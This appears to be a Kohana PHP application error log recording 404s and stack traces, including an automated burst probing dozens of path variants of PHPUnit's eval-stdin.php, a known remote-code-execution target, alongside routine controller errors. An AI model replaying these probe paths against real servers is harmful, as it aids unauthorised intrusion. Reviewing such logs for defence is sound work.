2025-10-29 21:21:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 21:21:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 21:21:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: llms.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 21:21:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: llms.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 21:35:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL RDWeb was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 21:35:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL RDWeb was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 21:43:19 --- ERROR: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
2025-10-29 21:43:19 --- STRACE: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
--
#0 [internal function]: Kohana_Core::shutdown_handler()
#1 {main}
2025-10-29 22:06:02 --- ERROR: ErrorException [ 8 ]: Undefined index: email ~ APPPATH/classes/controller/passengers.php [ 4903 ]
2025-10-29 22:06:02 --- STRACE: ErrorException [ 8 ]: Undefined index: email ~ APPPATH/classes/controller/passengers.php [ 4903 ]
--
#0 /var/www/html/application/classes/controller/passengers.php(4903): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 4903, Array)
#1 [internal function]: Controller_Passengers->action_tell_to_friend()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Passengers))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-29 22:33:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:33:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:35:13 --- ERROR: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
2025-10-29 22:35:13 --- STRACE: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
--
#0 [internal function]: Kohana_Core::shutdown_handler()
#1 {main}
2025-10-29 22:40:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:40:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:41:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 22:41:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 22:50:43 --- ERROR: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
2025-10-29 22:50:43 --- STRACE: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
--
#0 [internal function]: Kohana_Core::shutdown_handler()
#1 {main}
2025-10-29 23:10:02 --- ERROR: ErrorException [ 8 ]: Undefined index: email ~ APPPATH/classes/controller/passengers.php [ 4903 ]
2025-10-29 23:10:02 --- STRACE: ErrorException [ 8 ]: Undefined index: email ~ APPPATH/classes/controller/passengers.php [ 4903 ]
--
#0 /var/www/html/application/classes/controller/passengers.php(4903): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 4903, Array)
#1 [internal function]: Controller_Passengers->action_tell_to_friend()
#2 /var/www/html/system/classes/kohana/request/client/internal.php(118): ReflectionMethod->invoke(Object(Controller_Passengers))
#3 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#4 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#5 /var/www/html/index.php(115): Kohana_Request->execute()
#6 {main}
2025-10-29 23:21:05 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 23:21:05 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 23:24:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 23:24:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 23:55:55 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL bins was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 23:55:55 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL bins was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 23:59:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 23:59:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}